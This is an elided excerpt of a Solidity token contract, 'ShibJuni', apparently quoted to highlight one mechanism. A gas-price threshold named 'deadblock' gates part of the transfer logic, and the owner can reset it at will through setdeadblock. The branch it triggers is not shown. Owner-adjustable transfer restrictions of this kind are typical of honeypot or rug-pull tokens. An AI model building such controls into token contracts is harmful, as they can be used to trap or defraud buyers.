...
contract ShibJuni is IERC20, Ownable {
    ...
    uint256 deadblock = 5 * 1 gwei;
    uint256 vestingtime = 300;

    bool public claimingFees = true; 
    bool alternateSwaps = true;
    uint256 smallSwapThreshold = _totalSupply * 25 / 10000;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= deadblock && recipient != pair) {
    ...
    function setdeadblock (uint256 _deadblock) public onlyOwner {
               deadblock = _deadblock * 1 gwei; 
